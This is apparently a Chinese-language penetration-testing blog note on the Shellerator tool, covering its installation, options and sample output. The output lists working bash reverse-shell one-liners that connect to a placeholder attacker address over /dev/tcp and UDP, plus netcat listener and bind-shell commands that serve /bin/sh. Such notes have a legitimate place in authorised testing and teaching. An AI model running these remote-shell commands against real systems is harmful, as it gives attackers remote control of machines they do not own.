---
layer: article
title: Reverse/Bind Shells
tags: tools,pentest
---

在日常的渗透测试过程中，获得了webshell后往往会反弹shell，这里整理了几个工具。

涉及举例：

本地攻击机IP为`111.111.111.111` ，若反向连接时监听端口`111`

被攻击靶机IP为`192.168.1.1`，若正向连接时监听端口`888`

# [Shellerator](https://github.com/ShutdownRepo/shellerator)

## 安装

Kali Linux上需要单独安装Shellerator，安装完成后通过执行python文件或者`~/.local/bin/shellerator` 均可，如需也可以`sudo cp ~/.local/bin/shellerator /usr/sbin`方便快速执行。

```bash
$ git clone https://github.com/ShutdownRepo/shellerator
$ cd shellerator
$ python3 setup.py install --user
$ python shellerator.py -l
Reverse shells
   - awk
   - bash
   - groovy
   - java
   - lua
   - meterpreter
   - ncat
   - netcat
   - nodejs
   - openssl
   - perl
   - php
   - powershell
   - python
   - ruby
   - socat
   - tclsh
   - telnet
   - war

Bind shells
   - netcat

```

## 使用

```bash
usage: shellerator.py [-h] [-b | -r] [-t TYPE] [-p LPORT] [-i LHOST]

Generate a bind/reverse shell

optional arguments:
  -h, --help              show this help message and exit
  -l, --list            Print all the types of shells shellerator can generate
  -b, --bind-shell        Generate a bind shell (you connect to the target)
  -r, --reverse-shell     Generate a reverse shell (the target connects to you)(Default)

Bind shell options:
  -t TYPE, --type TYPE    Type of the shell to generate (Bash, Powershell, Java...)
  -p LPORT, --port LPORT  Listener Port

Reverse shell options:
  -t TYPE, --type TYPE    Type of the shell to generate (Bash, Powershell, Java...)
  -i LHOST, --ip LHOST    Listener IP address
  -p LPORT, --port LPORT  Listener Port
```

## 实例

- 生成bash脚本，在被攻击靶机上执行，反弹shell到攻击机的`111`端口

```bash
$ python shellerator.py -r -lp 111 -t bash 
(custom) Listener interface/address?
> 111.111.111.111

[1] /bin/bash -c '/bin/bash -i >& /dev/tcp/111.111.111.111/111 0>&1'

[2] /bin/bash -c '/bin/bash -i > /dev/tcp/111.111.111.111/111 0<&1 2>&1'

[3] /bin/bash -i > /dev/tcp/111.111.111.111/111 0<& 2>&1

[4] bash -i >& /dev/tcp/111.111.111.111/111 0>&1

[5] exec 5<>/dev/tcp/111.111.111.111/111;cat <&5 | while read line; do $line 2>&5 >&5; done

[6] exec /bin/sh 0</dev/tcp/111.111.111.111/111 1>&0 2>&0

[7] 0<&196;exec 196<>/dev/tcp/111.111.111.111/111; sh <&196 >&196 2>&196

[8] UDP bash -i >& /dev/udp/111.111.111.111/111 0>&1

[9] UDP Listener (attacker) nc -u -lvp 111

CLI command used
shellerator.py --reverse-shell --type bash --lhost 111.111.111.111 --lport 111

```

- 生成`nc`命令，在被攻击靶机上执行，开启`888`端口

```bash
$ python shellerator.py -b  
(custom) Listener port?
> 888

[1] nc -lvp 888 -e /bin/sh

CLI command used
shellerator.py --bind-shell --type netcat --lport 888
```

